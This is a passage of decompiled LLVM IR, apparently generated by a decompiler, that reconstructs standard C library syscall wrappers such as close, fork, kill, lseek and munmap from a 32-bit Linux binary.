define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_804fa8d = load i32, i32* @esi, align 4
  store i32 %v0_804fa8d, i32* %stack_var_-8, align 4
  %v4_804fa95 = ptrtoint %sigaction* %arg2 to i32
  store i32 %v4_804fa95, i32* @ecx, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804faa1 = load i32, i32* @ebx, align 4
  %v7_804faa9 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_804faa9, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v7_804faa9, -4095
  br i1 %tmp, label %dec_label_pc_804fac1, label %dec_label_pc_804fab5

dec_label_pc_804fab5:                             ; preds = %entry
  %v1_804fab5 = call i32 @__errno_location(i32 %v0_804faa1)
  %v0_804faba = load i32, i32* %esi.global-to-local, align 4
  %v1_804faba = sub i32 0, %v0_804faba
  %v2_804fabc = inttoptr i32 %v1_804fab5 to i32*
  store i32 %v1_804faba, i32* %v2_804fabc, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fac1

dec_label_pc_804fac1:                             ; preds = %entry, %dec_label_pc_804fab5
  %v0_804fac2 = phi i32 [ %v7_804faa9, %entry ], [ -1, %dec_label_pc_804fab5 ]
  %v2_804fac4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804fac4, i32* @esi, align 4
  ret i32 %v0_804fac2

; uselistorder directives
  uselistorder i32 %v7_804faa9, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fac1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804faf0 = load i32, i32* @edi, align 4
  store i32 %v0_804faf0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804faf8 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804fb00 = call i32 @close(i32 %v0_804faf8)
  store i32 %v0_804faf8, i32* @ebx, align 4
  store i32 %v1_804fb00, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804fb00, -4095
  br i1 %tmp, label %dec_label_pc_804fb18, label %dec_label_pc_804fb0c

dec_label_pc_804fb0c:                             ; preds = %entry
  %v1_804fb0c = call i32 @__errno_location(i32 %v0_804faf8)
  %v0_804fb11 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fb11 = sub i32 0, %v0_804fb11
  %v2_804fb13 = inttoptr i32 %v1_804fb0c to i32*
  store i32 %v1_804fb11, i32* %v2_804fb13, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fb18

dec_label_pc_804fb18:                             ; preds = %entry, %dec_label_pc_804fb0c
  %v0_804fb19 = phi i32 [ %v1_804fb00, %entry ], [ -1, %dec_label_pc_804fb0c ]
  %v2_804fb18 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fb18, i32* @edx, align 4
  %v2_804fb1c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fb1c, i32* @edi, align 4
  ret i32 %v0_804fb19

; uselistorder directives
  uselistorder i32 %v1_804fb00, { 1, 0, 2 }
  uselistorder i32 %v0_804faf8, { 1, 0, 2 }
  uselistorder i32 (i32)* @close, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fb18, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fb20 = load i32, i32* @ebx, align 4
  store i32 %v0_804fb20, i32* %stack_var_-4, align 4
  %v1_804fb29 = call i32 @fork(i32 %v0_804fb20)
  store i32 %v1_804fb29, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804fb29, -4095
  br i1 %tmp, label %dec_label_pc_804fb40, label %dec_label_pc_804fb34

dec_label_pc_804fb34:                             ; preds = %entry
  %v0_804fb34 = load i32, i32* %stack_var_-4, align 4
  %v1_804fb34 = call i32 @__errno_location(i32 %v0_804fb34)
  %v0_804fb39 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fb39 = sub i32 0, %v0_804fb39
  %v2_804fb3b = inttoptr i32 %v1_804fb34 to i32*
  store i32 %v1_804fb39, i32* %v2_804fb3b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fb40

dec_label_pc_804fb40:                             ; preds = %entry, %dec_label_pc_804fb34
  %v0_804fb41 = phi i32 [ %v1_804fb29, %entry ], [ -1, %dec_label_pc_804fb34 ]
  %v2_804fb44 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fb44, i32* @ebx, align 4
  ret i32 %v0_804fb41

; uselistorder directives
  uselistorder i32 %v1_804fb29, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32)* @fork, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804fb40, { 1, 0 }
}

define i32 @__libc_fsync(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fb48 = load i32, i32* @edi, align 4
  store i32 %v0_804fb48, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804fb50 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804fb58 = call i32 @fsync(i32 %v0_804fb50)
  store i32 %v1_804fb58, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804fb58, -4095
  br i1 %tmp, label %dec_label_pc_804fb70, label %dec_label_pc_804fb64

dec_label_pc_804fb64:                             ; preds = %entry
  %v1_804fb64 = call i32 @__errno_location(i32 %v0_804fb50)
  %v0_804fb69 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fb69 = sub i32 0, %v0_804fb69
  %v2_804fb6b = inttoptr i32 %v1_804fb64 to i32*
  store i32 %v1_804fb69, i32* %v2_804fb6b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fb70

dec_label_pc_804fb70:                             ; preds = %entry, %dec_label_pc_804fb64
  %v0_804fb71 = phi i32 [ %v1_804fb58, %entry ], [ -1, %dec_label_pc_804fb64 ]
  %v2_804fb74 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fb74, i32* @edi, align 4
  ret i32 %v0_804fb71

; uselistorder directives
  uselistorder i32 %v1_804fb58, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fb70, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fb78 = load i32, i32* @ebx, align 4
  store i32 %v0_804fb78, i32* %stack_var_-4, align 4
  %v1_804fb81 = call i32 @int80_syscall(i32 201)
  store i32 %v1_804fb81, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804fb81, -4095
  br i1 %tmp, label %dec_label_pc_804fb98, label %dec_label_pc_804fb8c

dec_label_pc_804fb8c:                             ; preds = %entry
  %v0_804fb8c = load i32, i32* %stack_var_-4, align 4
  %v1_804fb8c = call i32 @__errno_location(i32 %v0_804fb8c)
  %v0_804fb91 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fb91 = sub i32 0, %v0_804fb91
  %v2_804fb93 = inttoptr i32 %v1_804fb8c to i32*
  store i32 %v1_804fb91, i32* %v2_804fb93, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fb98

dec_label_pc_804fb98:                             ; preds = %entry, %dec_label_pc_804fb8c
  %v0_804fb99 = phi i32 [ %v1_804fb81, %entry ], [ -1, %dec_label_pc_804fb8c ]
  %v2_804fb9c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fb9c, i32* @ebx, align 4
  ret i32 %v0_804fb99

; uselistorder directives
  uselistorder i32 %v1_804fb81, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fb98, { 1, 0 }
}

define i32 @__GI_getpagesize(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804fba0 = load i32, i32* @global_var_8067654.156, align 4
  store i32 %v0_804fba0, i32* @edx, align 4
  %v1_804fbab = icmp eq i32 %v0_804fba0, 0
  %v1_804fbad = icmp eq i1 %v1_804fbab, false
  %v4_804fbad = select i1 %v1_804fbad, i32 %v0_804fba0, i32 4096
  ret i32 %v4_804fbad
}

define i32 @__libc_getpid(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fbb4 = load i32, i32* @ebx, align 4
  store i32 %v0_804fbb4, i32* %stack_var_-4, align 4
  %v1_804fbbd = call i32 @getpid(i32 %v0_804fbb4)
  store i32 %v1_804fbbd, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804fbbd, -4095
  br i1 %tmp, label %dec_label_pc_804fbd4, label %dec_label_pc_804fbc8

dec_label_pc_804fbc8:                             ; preds = %entry
  %v0_804fbc8 = load i32, i32* %stack_var_-4, align 4
  %v1_804fbc8 = call i32 @__errno_location(i32 %v0_804fbc8)
  %v0_804fbcd = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fbcd = sub i32 0, %v0_804fbcd
  %v2_804fbcf = inttoptr i32 %v1_804fbc8 to i32*
  store i32 %v1_804fbcd, i32* %v2_804fbcf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fbd4

dec_label_pc_804fbd4:                             ; preds = %entry, %dec_label_pc_804fbc8
  %v0_804fbd5 = phi i32 [ %v1_804fbbd, %entry ], [ -1, %dec_label_pc_804fbc8 ]
  %v2_804fbd8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fbd8, i32* @ebx, align 4
  ret i32 %v0_804fbd5

; uselistorder directives
  uselistorder i32 %v1_804fbbd, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fbd4, { 1, 0 }
}

define i32 @getppid(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fbdc = load i32, i32* @ebx, align 4
  store i32 %v0_804fbdc, i32* %stack_var_-4, align 4
  %v1_804fbe5 = call i32 @getppid(i32 %v0_804fbdc)
  store i32 %v1_804fbe5, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804fbe5, -4095
  br i1 %tmp, label %dec_label_pc_804fbfc, label %dec_label_pc_804fbf0

dec_label_pc_804fbf0:                             ; preds = %entry
  %v0_804fbf0 = load i32, i32* %stack_var_-4, align 4
  %v1_804fbf0 = call i32 @__errno_location(i32 %v0_804fbf0)
  %v0_804fbf5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fbf5 = sub i32 0, %v0_804fbf5
  %v2_804fbf7 = inttoptr i32 %v1_804fbf0 to i32*
  store i32 %v1_804fbf5, i32* %v2_804fbf7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fbfc

dec_label_pc_804fbfc:                             ; preds = %entry, %dec_label_pc_804fbf0
  %v0_804fbfd = phi i32 [ %v1_804fbe5, %entry ], [ -1, %dec_label_pc_804fbf0 ]
  %v2_804fc00 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fc00, i32* @ebx, align 4
  ret i32 %v0_804fbfd

; uselistorder directives
  uselistorder i32 %v1_804fbe5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32)* @getppid, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fbfc, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fc04 = load i32, i32* @ebx, align 4
  store i32 %v0_804fc04, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804fc17 = call i32 @int80_syscall(i32 191)
  store i32 %v1_804fc17, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804fc17, -4095
  br i1 %tmp, label %dec_label_pc_804fc30, label %dec_label_pc_804fc24

dec_label_pc_804fc24:                             ; preds = %entry
  %v0_804fc24 = load i32, i32* %stack_var_-4, align 4
  %v1_804fc24 = call i32 @__errno_location(i32 %v0_804fc24)
  %v0_804fc29 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fc29 = sub i32 0, %v0_804fc29
  %v2_804fc2b = inttoptr i32 %v1_804fc24 to i32*
  store i32 %v1_804fc29, i32* %v2_804fc2b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fc30

dec_label_pc_804fc30:                             ; preds = %entry, %dec_label_pc_804fc24
  %v0_804fc31 = phi i32 [ %v1_804fc17, %entry ], [ -1, %dec_label_pc_804fc24 ]
  %v2_804fc34 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fc34, i32* @ebx, align 4
  ret i32 %v0_804fc31

; uselistorder directives
  uselistorder i32 %v1_804fc17, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fc30, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804fc38 = load i32, i32* @ebx, align 4
  store i32 %v0_804fc38, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_804fc4b = call i32 @gettimeofday(i32 %v0_804fc38, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_804fc4b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804fc4b, -4095
  br i1 %tmp, label %dec_label_pc_804fc64, label %dec_label_pc_804fc58

dec_label_pc_804fc58:                             ; preds = %entry
  %v0_804fc58 = load i32, i32* %stack_var_-4, align 4
  %v1_804fc58 = call i32 @__errno_location(i32 %v0_804fc58)
  %v0_804fc5d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fc5d = sub i32 0, %v0_804fc5d
  %v2_804fc5f = inttoptr i32 %v1_804fc58 to i32*
  store i32 %v1_804fc5d, i32* %v2_804fc5f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fc64

dec_label_pc_804fc64:                             ; preds = %entry, %dec_label_pc_804fc58
  %v0_804fc65 = phi i32 [ %v4_804fc4b, %entry ], [ -1, %dec_label_pc_804fc58 ]
  %v2_804fc68 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fc68, i32* @ebx, align 4
  ret i32 %v0_804fc65

; uselistorder directives
  uselistorder i32 %v4_804fc4b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fc64, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804fc6c = load i32, i32* @edi, align 4
  store i32 %v0_804fc6c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804fc84 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804fc8c = call i32 @ioctl(i32 %v0_804fc84, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_804fc84, i32* @ebx, align 4
  store i32 %v3_804fc8c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_804fc8c, -4095
  br i1 %tmp, label %dec_label_pc_804fca4, label %dec_label_pc_804fc98

dec_label_pc_804fc98:                             ; preds = %entry
  %v1_804fc98 = call i32 @__errno_location(i32 %v0_804fc84)
  %v0_804fc9d = load i32, i32* %edi.global-to-local, align 4
  %v1_804fc9d = sub i32 0, %v0_804fc9d
  %v2_804fc9f = inttoptr i32 %v1_804fc98 to i32*
  store i32 %v1_804fc9d, i32* %v2_804fc9f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fca4

dec_label_pc_804fca4:                             ; preds = %entry, %dec_label_pc_804fc98
  %v0_804fca7 = phi i32 [ %v3_804fc8c, %entry ], [ -1, %dec_label_pc_804fc98 ]
  %v2_804fca9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fca9, i32* @edi, align 4
  ret i32 %v0_804fca7

; uselistorder directives
  uselistorder i32 %v3_804fc8c, { 1, 0, 2 }
  uselistorder i32 %v0_804fc84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fca4, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fcac = load i32, i32* @ebx, align 4
  store i32 %v0_804fcac, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_804fcbf = call i32 @kill(i32 %v0_804fcac, i32 %tmp4)
  store i32 %v2_804fcbf, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804fcbf, -4095
  br i1 %tmp, label %dec_label_pc_804fcd8, label %dec_label_pc_804fccc

dec_label_pc_804fccc:                             ; preds = %entry
  %v0_804fccc = load i32, i32* %stack_var_-4, align 4
  %v1_804fccc = call i32 @__errno_location(i32 %v0_804fccc)
  %v0_804fcd1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fcd1 = sub i32 0, %v0_804fcd1
  %v2_804fcd3 = inttoptr i32 %v1_804fccc to i32*
  store i32 %v1_804fcd1, i32* %v2_804fcd3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fcd8

dec_label_pc_804fcd8:                             ; preds = %entry, %dec_label_pc_804fccc
  %v0_804fcd9 = phi i32 [ %v2_804fcbf, %entry ], [ -1, %dec_label_pc_804fccc ]
  %v2_804fcd8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fcd8, i32* @edx, align 4
  %v2_804fcdc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fcdc, i32* @ebx, align 4
  ret i32 %v0_804fcd9

; uselistorder directives
  uselistorder i32 %v2_804fcbf, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @kill, { 6, 4, 0, 1, 5, 2, 3 }
  uselistorder label %dec_label_pc_804fcd8, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804fce2 = load i32, i32* @ebx, align 4
  store i32 %v0_804fce2, i32* %stack_var_-12, align 4
  %v2_804fcea = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804fcea, i32* %esi.global-to-local, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v1_804fd04 = call i32 @int80_syscall(i32 140)
  store i32 %v1_804fd04, i32* %esi.global-to-local, align 4
  %tmp16 = icmp ult i32 %v1_804fd04, -4095
  br i1 %tmp16, label %dec_label_pc_804fd1e, label %dec_label_pc_804fd10

dec_label_pc_804fd10:                             ; preds = %entry
  %v1_804fd10 = call i32 @__errno_location(i32 %arg3)
  %v0_804fd15 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fd15 = sub i32 0, %v0_804fd15
  %v2_804fd17 = inttoptr i32 %v1_804fd10 to i32*
  store i32 %v1_804fd15, i32* %v2_804fd17, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fd22

dec_label_pc_804fd1e:                             ; preds = %entry
  %v1_804fd1e = icmp eq i32 %v1_804fd04, 0
  br i1 %v1_804fd1e, label %dec_label_pc_804fd27, label %dec_label_pc_804fd22

dec_label_pc_804fd22:                             ; preds = %dec_label_pc_804fd1e, %dec_label_pc_804fd10
  %v0_804fd22 = phi i32 [ %v1_804fd04, %dec_label_pc_804fd1e ], [ -1, %dec_label_pc_804fd10 ]
  %v1_804fd24 = ashr i32 %v0_804fd22, 31
  br label %dec_label_pc_804fd2f

dec_label_pc_804fd27:                             ; preds = %dec_label_pc_804fd1e
  %v3_804fd27 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_804fd2f

dec_label_pc_804fd2f:                             ; preds = %dec_label_pc_804fd22, %dec_label_pc_804fd27
  %v0_804fd35 = phi i32 [ %v0_804fd22, %dec_label_pc_804fd22 ], [ %v3_804fd27, %dec_label_pc_804fd27 ]
  %storemerge = phi i32 [ %v1_804fd24, %dec_label_pc_804fd22 ], [ %tmp, %dec_label_pc_804fd27 ]
  store i32 %storemerge, i32* @edx, align 4
  %v2_804fd32 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fd32, i32* @ebx, align 4
  ret i32 %v0_804fd35

; uselistorder directives
  uselistorder i32 %v1_804fd04, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804fd2f, { 1, 0 }
}

define i32 @_longjmp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v1_804fd45 = add i32 %arg1, 24
  %v2_804fd45 = inttoptr i32 %v1_804fd45 to i32*
  %v3_804fd45 = load i32, i32* %v2_804fd45, align 4
  %v4_804fd45 = icmp eq i32 %v3_804fd45, 0
  br i1 %v4_804fd45, label %entry.dec_label_pc_804fd5c_crit_edge, label %dec_label_pc_804fd4b

entry.dec_label_pc_804fd5c_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804fd5c

dec_label_pc_804fd4b:                             ; preds = %entry
  %v1_804fd4e = add i32 %arg1, 28
  %v3_804fd54 = inttoptr i32 %v1_804fd4e to %_TYPEDEF_sigset_t*
  %v4_804fd54 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_804fd54, i32 0)
  %v0_804fd69.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804fd5c

dec_label_pc_804fd5c:                             ; preds = %entry.dec_label_pc_804fd5c_crit_edge, %dec_label_pc_804fd4b
  %v0_804fd69 = phi i32 [ %arg1, %entry.dec_label_pc_804fd5c_crit_edge ], [ %v0_804fd69.pre, %dec_label_pc_804fd4b ]
  %v1_804fd61 = icmp eq i32 %arg2, 0
  %v3_804fd63 = select i1 %v1_804fd61, i32 1, i32 %arg2
  %v4_804fd6a = inttoptr i32 %v0_804fd69 to i32*
  %v5_804fd6a = call i32 @__longjmp(i32* %v4_804fd6a, i32 %v3_804fd63, i32 1, i32 1)
  ret i32 %v5_804fd6a

; uselistorder directives
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804fd5c, { 1, 0 }
}

define i32 @__GI___libc_lseek(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fd70 = load i32, i32* @edi, align 4
  store i32 %v0_804fd70, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_804fd80 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804fd88 = call i32 @lseek(i32 %v0_804fd80)
  store i32 %v0_804fd80, i32* @ebx, align 4
  store i32 %v1_804fd88, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804fd88, -4095
  br i1 %tmp, label %dec_label_pc_804fda0, label %dec_label_pc_804fd94

dec_label_pc_804fd94:                             ; preds = %entry
  %v1_804fd94 = call i32 @__errno_location(i32 %v0_804fd80)
  %v0_804fd99 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fd99 = sub i32 0, %v0_804fd99
  %v2_804fd9b = inttoptr i32 %v1_804fd94 to i32*
  store i32 %v1_804fd99, i32* %v2_804fd9b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fda0

dec_label_pc_804fda0:                             ; preds = %entry, %dec_label_pc_804fd94
  %v0_804fda1 = phi i32 [ %v1_804fd88, %entry ], [ -1, %dec_label_pc_804fd94 ]
  %v2_804fda4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fda4, i32* @edi, align 4
  ret i32 %v0_804fda1

; uselistorder directives
  uselistorder i32 %v1_804fd88, { 1, 0, 2 }
  uselistorder i32 %v0_804fd80, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fda0, { 1, 0 }
}

define i32 @__libc_msync(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fda8 = load i32, i32* @edi, align 4
  store i32 %v0_804fda8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_804fdb8 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804fdc0 = call i32 @msync(i32 %v0_804fdb8)
  store i32 %v1_804fdc0, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804fdc0, -4095
  br i1 %tmp, label %dec_label_pc_804fdd8, label %dec_label_pc_804fdcc

dec_label_pc_804fdcc:                             ; preds = %entry
  %v1_804fdcc = call i32 @__errno_location(i32 %v0_804fdb8)
  %v0_804fdd1 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fdd1 = sub i32 0, %v0_804fdd1
  %v2_804fdd3 = inttoptr i32 %v1_804fdcc to i32*
  store i32 %v1_804fdd1, i32* %v2_804fdd3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fdd8

dec_label_pc_804fdd8:                             ; preds = %entry, %dec_label_pc_804fdcc
  %v0_804fdd9 = phi i32 [ %v1_804fdc0, %entry ], [ -1, %dec_label_pc_804fdcc ]
  %v2_804fddc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fddc, i32* @edi, align 4
  ret i32 %v0_804fdd9

; uselistorder directives
  uselistorder i32 %v1_804fdc0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fdd8, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fde0 = load i32, i32* @ebx, align 4
  store i32 %v0_804fde0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_804fdf3 = call i32 @munmap(i32 %v0_804fde0, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_804fdf3, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804fdf3, -4095
  br i1 %tmp, label %dec_label_pc_804fe0c, label %dec_label_pc_804fe00

dec_label_pc_804fe00:                             ; preds = %entry
  %v0_804fe00 = load i32, i32* %stack_var_-4, align 4
  %v1_804fe00 = call i32 @__errno_location(i32 %v0_804fe00)
  %v0_804fe05 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fe05 = sub i32 0, %v0_804fe05
  %v2_804fe07 = inttoptr i32 %v1_804fe00 to i32*
  store i32 %v1_804fe05, i32* %v2_804fe07, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fe0c

dec_label_pc_804fe0c:                             ; preds = %entry, %dec_label_pc_804fe00
  %v0_804fe0d = phi i32 [ %v4_804fdf3, %entry ], [ -1, %dec_label_pc_804fe00 ]
  %v2_804fe0c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fe0c, i32* @edx, align 4
  %v2_804fe10 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fe10, i32* @ebx, align 4
  ret i32 %v0_804fe0d

; uselistorder directives
  uselistorder i32 %v4_804fdf3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fe0c, { 1, 0 }
}

